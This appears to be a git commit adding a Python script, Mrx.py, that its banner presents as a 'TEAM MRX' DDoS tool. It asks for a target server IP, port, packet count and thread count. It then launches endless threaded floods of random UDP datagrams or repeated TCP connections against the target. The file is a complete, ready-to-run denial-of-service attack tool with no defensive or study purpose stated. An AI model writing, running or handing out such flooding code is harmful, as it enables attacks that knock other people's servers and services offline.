cff265769ad48ca2b277a40b996b41ecd86e4569
Zinoubba345 <hdnf03210@gmail.com>
2024-09-14 09:30:51 +0100

    Mrx.py

---
+++ Mrx.py
@@ -0,0 +1,83 @@
+import random
+import socket
+import threading
+import platform
+import codecs
+import struct
+import time
+import socket
+import sys
+import os
+
+print("DDoS is Running in : "+platform.system())
+
+if platform.system() == 'Windows':
+
+	print("""
+ TEAM MRX is Presenting to you :
+▀▀█▀▀ ▒█▀▀▀ ░█▀▀█ ▒█▀▄▀█ 　█▀▄▀█ █▀▀█ █░█ 
+░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▒█▒█ 　█░▀░█ █▄▄▀ ▄▀▄  
+░▒█░░ ▒█▄▄▄ ▒█░▒█ ▒█░░▒█ 　▀░░░▀ ▀░▀▀ ▀░▀  """)
+else :
+	print("""
+	'\033[4;28m'
+ TEAM MRX is Presenting to you :
+
+⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+ ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+ ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+ ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄  ⣀⣤⣴⣿⣿⣿⣆
+ ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+             dev: zinou
+ ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+ ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+			""")
+
+
+print("DDos")
+ip= str(input("                    Server ip MRX :"))
+port= int(input("                    port MRX :"))
+choice = str(input("                   DDoS Attack?? (y/n) MRX :"))
+times= int(input("                   Paket MRX :"))
+threads= int(input("                    threads MRX :"))
+fake_ip = '154.121.76.200'
+#Starting Attacking
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[-]","[•]","[×]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"TEAM MRX YA9TA7EM!!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[-]","[+]","[x]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"TEAM MRX YA9TA7EM!!!!")
+		except:
+			s.close()
+			print("[*] Error")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
